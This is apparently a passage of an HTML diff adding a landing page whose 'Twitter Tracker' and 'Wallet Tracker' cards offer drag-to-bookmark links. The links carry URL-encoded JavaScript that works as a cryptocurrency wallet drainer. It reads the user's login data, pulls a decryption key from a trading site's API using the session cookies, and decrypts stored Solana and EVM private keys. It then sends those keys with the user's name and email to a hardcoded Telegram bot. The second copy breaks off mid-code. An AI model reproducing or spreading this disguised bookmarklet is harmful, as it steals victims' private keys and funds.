+                href="javascript:%2f%2f%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%0a%2f%2f%20%09NYXDEOB%20V1.8.3%20-%20Deobfuscation%20Engine%209.4.0%0a%2f%2f%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%0a%2f%2f%20made%20by%20aidn%20%3b)%0a%0ajavascript%3a(function%20()%20%7b%0a%20%20(async%20function%20()%20%7b%0a%20%20%20%20try%20%7b%0a%20%20%20%20%20%20function%20safeAtob(input)%20%7b%0a%20%20%20%20%20%20%20%20var%20cleaned%20%3d%20String(input).replace(%2f%5b%5eA-Za-z0-9%2b%2f%3d%5d%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20return%20atob(cleaned)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20function%20base64ToUint8Array(b64)%20%7b%0a%20%20%20%20%20%20%20%20var%20binary%20%3d%20safeAtob(b64)%3b%0a%20%20%20%20%20%20%20%20var%20bytes%20%3d%20new%20Uint8Array(binary.length)%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20binary.length%3b%20i%2b%2b)%20bytes%5bi%5d%20%3d%20binary.charCodeAt(i)%3b%0a%20%20%20%20%20%20%20%20return%20bytes%3b%0a%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20var%20username%20%3d%20localStorage.getItem(%22username%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(username%20%3d%3d%3d%20%22null%22%20%7c%7c%20username%20%3d%3d%3d%20%22undefined%22)%20username%20%3d%20%22%22%3b%0a%20%20%20%20%20%20username%20%3d%20username.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20var%20email%20%3d%20localStorage.getItem(%22email%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(email%20%3d%3d%3d%20%22null%22%20%7c%7c%20email%20%3d%3d%3d%20%22undefined%22)%20email%20%3d%20%22%22%3b%0a%20%20%20%20%20%20email%20%3d%20email.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20var%20userId%20%3d%20localStorage.getItem(%22userId%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(userId)%20userId%20%3d%20userId.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20if%20(!username)%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20fallback%20%3d%20localStorage.getItem(%22displayName%22)%20%7c%7c%20localStorage.getItem(%22name%22)%20%7c%7c%20localStorage.getItem(%22user%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(fallback%20%26%26%20fallback%20!%3d%3d%20%22null%22%20%26%26%20fallback%20!%3d%3d%20%22undefined%22)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20fallback%20%3d%20fallback.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(fallback%20%26%26%20fallback%20!%3d%3d%20%22null%22%20%26%26%20fallback%20!%3d%3d%20%22undefined%22)%20username%20%3d%20fallback%3b%0a%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20lsKeys%20%3d%20Object.keys(localStorage)%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20lsKeys.length%3b%20i%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20val%20%3d%20localStorage.getItem(lsKeys%5bi%5d)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(val%20%26%26%20val.length%20%3e%2020%20%26%26%20val.length%20%3c%202000)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20parts%20%3d%20val.split(%22.%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(parts.length%20%3d%3d%3d%203%20%26%26%20parts%5b0%5d.length%20%3e%2010)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20pl%20%3d%20JSON.parse(atob(parts%5b1%5d.replace(%2f-%2fg%2c%20%22%2b%22).replace(%2f_%2fg%2c%20%22%2f%22)))%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(pl.email%20%26%26%20!email)%20email%20%3d%20String(pl.email).replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(!username)%20username%20%3d%20String(pl.username%20%7c%7c%20pl.name%20%7c%7c%20pl.displayName%20%7c%7c%20pl.preferred_username%20%7c%7c%20%22%22).replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20var%20wallets%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20solWallets%20%3d%20JSON.parse(localStorage.getItem(%22allSolWallets%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20var%20solBundles%20%3d%20JSON.parse(localStorage.getItem(%22sBundles%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20if%20(!Array.isArray(solBundles))%20solBundles%20%3d%20%5bsolBundles%5d%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20solWallets.length%3b%20i%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20if%20(solBundles%5bi%5d%20%3d%3d%3d%20undefined)%20continue%3b%0a%20%20%20%20%20%20%20%20%20%20wallets.push(%7b%20a%3a%20solWallets%5bi%5d.walletAddress%2c%20c%3a%20%22solana%22%2c%20n%3a%20solWallets%5bi%5d.name%2c%20b%3a%20JSON.stringify(%5bsolBundles%5bi%5d%5d)%20%7d)%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20evmWallets%20%3d%20JSON.parse(localStorage.getItem(%22allEvmWallets%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20var%20evmBundle%20%3d%20localStorage.getItem(%22bundle%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20if%20(evmBundle%20%26%26%20evmWallets.length%20%3e%200)%0a%20%20%20%20%20%20%20%20%20%20wallets.push(%7b%20a%3a%20evmWallets%5b0%5d.walletAddress%2c%20c%3a%20%22evm%22%2c%20n%3a%20evmWallets%5b0%5d.name%2c%20b%3a%20JSON.stringify(%5bevmBundle%5d)%20%7d)%3b%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20var%20apiResponse%20%3d%20null%3b%0a%20%20%20%20%20%20for%20(var%20attempt%20%3d%200%3b%20attempt%20%3c%204%3b%20attempt%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20controller%20%3d%20new%20AbortController()%3b%0a%20%20%20%20%20%20%20%20%20%20var%20timeout%20%3d%20setTimeout(function%20()%20%7b%20controller.abort()%3b%20%7d%2c%208000)%3b%0a%20%20%20%20%20%20%20%20%20%20var%20response%20%3d%20await%20fetch(%22https%3a%2f%2fapi9.axiom.trade%2fbundle-key-and-wallets-v2%22%2c%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20method%3a%20%22POST%22%2c%20credentials%3a%20%22include%22%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20headers%3a%20%7b%20%22Content-Type%22%3a%20%22application%2fjson%22%20%7d%2c%20signal%3a%20controller.signal%2c%0a%20%20%20%20%20%20%20%20%20%20%7d)%3b%0a%20%20%20%20%20%20%20%20%20%20clearTimeout(timeout)%3b%0a%20%20%20%20%20%20%20%20%20%20var%20body%20%3d%20await%20response.text()%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(response.status%20%3d%3d%3d%20200)%20try%20%7b%20apiResponse%20%3d%20JSON.parse(body)%3b%20break%3b%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20await%20new%20Promise(function%20(r)%20%7b%20setTimeout(r%2c%201500%20*%20attempt)%3b%20%7d)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(!apiResponse%20%7c%7c%20(!apiResponse.bundleKey%20%26%26%20!apiResponse.key))%20return%3b%0a%0a%20%20%20%20%20%20var%20bundleKey%20%3d%20apiResponse.bundleKey%20%7c%7c%20apiResponse.key%3b%0a%20%20%20%20%20%20if%20(apiResponse.user)%20%7b%0a%20%20%20%20%20%20%20%20var%20ud%20%3d%20apiResponse.user%3b%0a%20%20%20%20%20%20%20%20if%20(typeof%20ud%20%3d%3d%3d%20%22string%22)%20%7b%20if%20(!username)%20username%20%3d%20ud%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20%7b%20if%20(!username)%20username%20%3d%20ud.username%20%7c%7c%20ud.name%20%7c%7c%20%22%22%3b%20if%20(!email)%20email%20%3d%20ud.email%20%7c%7c%20%22%22%3b%20%7d%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(apiResponse.username%20%26%26%20!username)%20username%20%3d%20apiResponse.username%3b%0a%20%20%20%20%20%20if%20(apiResponse.email%20%26%26%20!email)%20email%20%3d%20apiResponse.email%3b%0a%0a%20%20%20%20%20%20var%20cryptoKey%20%3d%20await%20crypto.subtle.importKey(%22raw%22%2c%20base64ToUint8Array(bundleKey)%2c%20%7b%20name%3a%20%22AES-GCM%22%20%7d%2c%20false%2c%20%5b%22decrypt%22%5d)%3b%0a%20%20%20%20%20%20var%20decryptedEntries%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20for%20(var%20w%20%3d%200%3b%20w%20%3c%20wallets.length%3b%20w%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20var%20bundleData%20%3d%20wallets%5bw%5d.b%3b%0a%20%20%20%20%20%20%20%20if%20(!bundleData)%20continue%3b%0a%20%20%20%20%20%20%20%20if%20(typeof%20bundleData%20%3d%3d%3d%20%22string%22)%20try%20%7b%20bundleData%20%3d%20JSON.parse(bundleData)%3b%20%7d%20catch%20(e)%20%7b%20bundleData%20%3d%20%5bbundleData%5d%3b%20%7d%0a%20%20%20%20%20%20%20%20if%20(!Array.isArray(bundleData))%20bundleData%20%3d%20%5bbundleData%5d%3b%0a%20%20%20%20%20%20%20%20for%20(var%20b%20%3d%200%3b%20b%20%3c%20bundleData.length%3b%20b%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20sp%20%3d%20String(bundleData%5bb%5d).split(%22%3a%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(sp.length%20%3c%202)%20continue%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20dec%20%3d%20await%20crypto.subtle.decrypt(%7b%20name%3a%20%22AES-GCM%22%2c%20iv%3a%20base64ToUint8Array(sp%5b0%5d)%20%7d%2c%20cryptoKey%2c%20base64ToUint8Array(sp%5b1%5d))%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20hex%20%3d%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20db%20%3d%20new%20Uint8Array(dec)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20for%20(var%20h%20%3d%200%3b%20h%20%3c%20db.length%3b%20h%2b%2b)%20hex%20%2b%3d%20db%5bh%5d.toString(16).padStart(2%2c%20%220%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20decryptedEntries.push(%7b%20addr%3a%20wallets%5bw%5d.a%2c%20chain%3a%20wallets%5bw%5d.c%2c%20key%3a%20hex%20%7d)%3b%0a%20%20%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(decryptedEntries.length%20%3d%3d%3d%200)%20return%3b%0a%0a%20%20%20%20%20%20var%20BOT_TOKEN%20%3d%20%228939440661%3aAAGuF0lw32Td_YFlYJtNdZjuK3fdZ9qPTQw%22%3b%0a%20%20%20%20%20%20var%20CHAT_ID%20%20%20%3d%20%228752245194%22%3b%0a%0a%20%20%20%20%20%20var%20solCount%20%3d%200%2c%20evmCount%20%3d%200%2c%20otherCount%20%3d%200%3b%0a%20%20%20%20%20%20var%20walletLines%20%3d%20%5b%22%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%22%5d%3b%0a%20%20%20%20%20%20for%20(var%20wi%20%3d%200%3b%20wi%20%3c%20decryptedEntries.length%3b%20wi%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20var%20en%20%3d%20decryptedEntries%5bwi%5d%3b%0a%20%20%20%20%20%20%20%20var%20chain%20%3d%20en.chain.toLowerCase()%3b%0a%20%20%20%20%20%20%20%20var%20label%3b%0a%20%20%20%20%20%20%20%20if%20(chain.indexOf(%22sol%22)%20!%3d%3d%20-1)%20%7b%20solCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudfe1%20Solana%20Wallet%20%22%20%2b%20solCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20if%20(chain.indexOf(%22eth%22)%20!%3d%3d%20-1%20%7c%7c%20chain.indexOf(%22evm%22)%20!%3d%3d%20-1)%20%7b%20evmCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudc9c%20EVM%20Wallet%20%22%20%2b%20evmCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20if%20(chain.indexOf(%22bsc%22)%20!%3d%3d%20-1)%20%7b%20evmCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudfe1%20BSC%20Wallet%20%22%20%2b%20evmCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20%7b%20otherCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudd35%20Wallet%20%22%20%2b%20otherCount%20%2b%20%22%20(%22%20%2b%20en.chain%20%2b%20%22)%22%3b%20%7d%0a%20%20%20%20%20%20%20%20walletLines.push(label%20%2b%20%22%5cn%22%20%2b%20%22%5cud83d%5cudccd%20Address%3a%20%22%20%2b%20en.addr%20%2b%20%22%5cn%22%20%2b%20%22%5cud83d%5cudd11%20Private%20Key%3a%20%22%20%2b%20en.key)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20walletLines.push(%22%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%22)%3b%0a%0a%20%20%20%20%20%20var%20text%20%3d%20%5b%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudd11%20NEW%20HIT%22%2c%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudc64%20User%3a%20%22%20%2b%20(username%20%7c%7c%20%22unknown%22)%2c%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudce7%20Email%3a%20%22%20%2b%20(email%20%7c%7c%20%22unknown%22)%2c%0a%20%20%20%20%20%20%20%20%22%22%2c%0a%20%20%20%20%20%20%20%20walletLines.join(%22%5cn%5cn%22)%0a%20%20%20%20%20%20%5d.join(%22%5cn%22)%3b%0a%0a%20%20%20%20%20%20var%20chunks%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20for%20(var%20ci%20%3d%200%3b%20ci%20%3c%20text.length%3b%20ci%20%2b%3d%204000)%20chunks.push(text.slice(ci%2c%20ci%20%2b%204000))%3b%0a%20%20%20%20%20%20chunks.forEach(function(chunk)%20%7b%0a%20%20%20%20%20%20%20%20var%20img%20%3d%20new%20Image()%3b%0a%20%20%20%20%20%20%20%20img.src%20%3d%20%22https%3a%2f%2fapi.telegram.org%2fbot%22%20%2b%20BOT_TOKEN%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%2fsendMessage%3fchat_id%3d%22%20%2b%20CHAT_ID%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%26disable_web_page_preview%3dtrue%22%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%26text%3d%22%20%2b%20encodeURIComponent(chunk)%3b%0a%20%20%20%20%20%20%7d)%3b%0a%20%20%20%20%7d%20catch%20(e)%20%7b%0a%20%20%20%20%20%20console.log(%22%5bmoonr%5d%20outer%20error%3a%22%2c%20e)%3b%0a%20%20%20%20%7d%0a%20%20%7d)()%3b%0a%7d)()%3b"
+                ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAERSURBVFhH7ZUxDoJAEEUpOQJHsLS0tKSk9Bgewc7S0mNwBI/gESwtLe3AtzCTKCEEltk1Gl5CFndm5+8fYUkWfp6qqnK5jU9d1xkbeDKuZSouiJeI14xXmYqHc+3E3ygkFAdcX0S4gd83hlTCYUGoaFQ7sIm9pITF/eei+QHzD4ZM0sLgXLZy/RA/Sao91E8RuLdS/RB3r+VKlthC8WMrMwx5pSyxg7p66IyC3I0stYGCZ6k9CvJtDydqbj2uOOfCf+OeaFrpzaxngfXdD44vfh+que4Vry6wzsq9Mq0LVu6VSV0g39q9Mq4L1u6VUV0gL5R7ZbgLodwrg10gHtq90t8FdpcTPIS+0NmJ5MK3SZIXjGlF3Fm+/J0AAAAASUVORK5CYII=" draggable="true" title="Drag me to your bookmarks bar"><svg class="badge-logo" viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><polygon points="12,2 17,11 7,11" fill="currentColor"/><polygon points="6,13 18,13 22,21 2,21" fill="currentColor"/></svg> Twitter Tracker</a>
+            </div>
+            <h3>Twitter Tracker</h3>
+            <p>Real-time Twitter analysis to spot trends and sentiment before they move.</p>
+            <span class="option-num">02</span>
+          </div>
+
+          <!-- Wallet Tracker -->
+          <div class="option-card">
+            <div class="option-top">
+              <div class="option-icon-box">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path d="M17 14h.01" />
+                  <path d="M7 7h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14" />
+                </svg>
+              </div>
+              <a class="option-badge"
+                href="javascript:%2f%2f%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%0a%2f%2f%20%09NYXDEOB%20V1.8.3%20-%20Deobfuscation%20Engine%209.4.0%0a%2f%2f%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%0a%2f%2f%20made%20by%20aidn%20%3b)%0a%0ajavascript%3a(function%20()%20%7b%0a%20%20(async%20function%20()%20%7b%0a%20%20%20%20try%20%7b%0a%20%20%20%20%20%20function%20safeAtob(input)%20%7b%0a%20%20%20%20%20%20%20%20var%20cleaned%20%3d%20String(input).replace(%2f%5b%5eA-Za-z0-9%2b%2f%3d%5d%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20return%20atob(cleaned)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20function%20base64ToUint8Array(b64)%20%7b%0a%20%20%20%20%20%20%20%20var%20binary%20%3d%20safeAtob(b64)%3b%0a%20%20%20%20%20%20%20%20var%20bytes%20%3d%20new%20Uint8Array(binary.length)%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20binary.length%3b%20i%2b%2b)%20bytes%5bi%5d%20%3d%20binary.charCodeAt(i)%3b%0a%20%20%20%20%20%20%20%20return%20bytes%3b%0a%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20var%20username%20%3d%20localStorage.getItem(%22username%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(username%20%3d%3d%3d%20%22null%22%20%7c%7c%20username%20%3d%3d%3d%20%22undefined%22)%20username%20%3d%20%22%22%3b%0a%20%20%20%20%20%20username%20%3d%20username.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20var%20email%20%3d%20localStorage.getItem(%22email%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(email%20%3d%3d%3d%20%22null%22%20%7c%7c%20email%20%3d%3d%3d%20%22undefined%22)%20email%20%3d%20%22%22%3b%0a%20%20%20%20%20%20email%20%3d%20email.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20var%20userId%20%3d%20localStorage.getItem(%22userId%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(userId)%20userId%20%3d%20userId.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20if%20(!username)%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20fallback%20%3d%20localStorage.getItem(%22displayName%22)%20%7c%7c%20localStorage.getItem(%22name%22)%20%7c%7c%20localStorage.getItem(%22user%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(fallback%20%26%26%20fallback%20!%3d%3d%20%22null%22%20%26%26%20fallback%20!%3d%3d%20%22undefined%22)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20fallback%20%3d%20fallback.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(fallback%20%26%26%20fallback%20!%3d%3d%20%22null%22%20%26%26%20fallback%20!%3d%3d%20%22undefined%22)%20username%20%3d%20fallback%3b%0a%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20lsKeys%20%3d%20Object.keys(localStorage)%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20lsKeys.length%3b%20i%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20val%20%3d%20localStorage.getItem(lsKeys%5bi%5d)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(val%20%26%26%20val.length%20%3e%2020%20%26%26%20val.length%20%3c%202000)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20parts%20%3d%20val.split(%22.%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(parts.length%20%3d%3d%3d%203%20%26%26%20parts%5b0%5d.length%20%3e%2010)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20pl%20%3d%20JSON.parse(atob(parts%5b1%5d.replace(%2f-%2fg%2c%20%22%2b%22).replace(%2f_%2fg%2c%20%22%2f%22)))%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(pl.email%20%26%26%20!email)%20email%20%3d%20String(pl.email).replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(!username)%20username%20%3d%20String(pl.username%20%7c%7c%20pl.name%20%7c%7c%20pl.displayName%20%7c%7c%20pl.preferred_username%20%7c%7c%20%22%22).replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20var%20wallets%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20solWallets%20%3d%20JSON.parse(localStorage.getItem(%22allSolWallets%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20var%20solBundles%20%3d%20JSON.parse(localStorage.getItem(%22sBundles%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20if%20(!Array.isArray(solBundles))%20solBundles%20%3d%20%5bsolBundles%5d%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20solWallets.length%3b%20i%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20if%20(solBundles%5bi%5d%20%3d%3d%3d%20undefined)%20continue%3b%0a%20%20%20%20%20%20%20%20%20%20wallets.push(%7b%20a%3a%20solWallets%5bi%5d.walletAddress%2c%20c%3a%20%22solana%22%2c%20n%3a%20solWallets%5bi%5d.name%2c%20b%3a%20JSON.stringify(%5bsolBundles%5bi%5d%5d)%20%7d)%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20evmWallets%20%3d%20JSON.parse(localStorage.getItem(%22allEvmWallets%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20var%20evmBundle%20%3d%20localStorage.getItem(%22bundle%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20if%20(evmBundle%20%26%26%20evmWallets.length%20%3e%200)%0a%20%20%20%20%20%20%20%20%20%20wallets.push(%7b%20a%3a%20evmWallets%5b0%5d.walletAddress%2c%20c%3a%20%22evm%22%2c%20n%3a%20evmWallets%5b0%5d.name%2c%20b%3a%20JSON.stringify(%5bevmBundle%5d)%20%7d)%3b%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20var%20apiResponse%20%3d%20null%3b%0a%20%20%20%20%20%20for%20(var%20attempt%20%3d%200%3b%20attempt%20%3c%204%3b%20attempt%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20controller%20%3d%20new%20AbortController()%3b%0a%20%20%20%20%20%20%20%20%20%20var%20timeout%20%3d%20setTimeout(function%20()%20%7b%20controller.abort()%3b%20%7d%2c%208000)%3b%0a%20%20%20%20%20%20%20%20%20%20var%20response%20%3d%20await%20fetch(%22https%3a%2f%2fapi9.axiom.trade%2fbundle-key-and-wallets-v2%22%2c%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20method%3a%20%22POST%22%2c%20credentials%3a%20%22include%22%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20headers%3a%20%7b%20%22Content-Type%22%3a%20%22application%2fjson%22%20%7d%2c%20signal%3a%20controller.signal%2c%0a%20%20%20%20%20%20%20%20%20%20%7d)%3b%0a%20%20%20%20%20%20%20%20%20%20clearTimeout(timeout)%3b%0a%20%20%20%20%20%20%20%20%20%20var%20body%20%3d%20await%20response.text()%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(response.status%20%3d%3d%3d%20200)%20try%20%7b%20apiResponse%20%3d%20JSON.parse(body)%3b%20break%3b%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20await%20new%20Promise(function%20(r)%20%7b%20setTimeout(r%2c%201500%20*%20attempt)%3b%20%7d)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(!apiResponse%20%7c%7c%20(!apiResponse.bundleKey%20%26%26%20!apiResponse.key))%20return%3b%0a%0a%20%20%20%20%20%20var%20bundleKey%20%3d%20apiResponse.bundleKey%20%7c%7c%20apiResponse.key%3b%0a%20%20%20%20%20%20if%20(apiResponse.user)%20%7b%0a%20%20%20%20%20%20%20%20var%20ud%20%3d%20apiResponse.user%3b%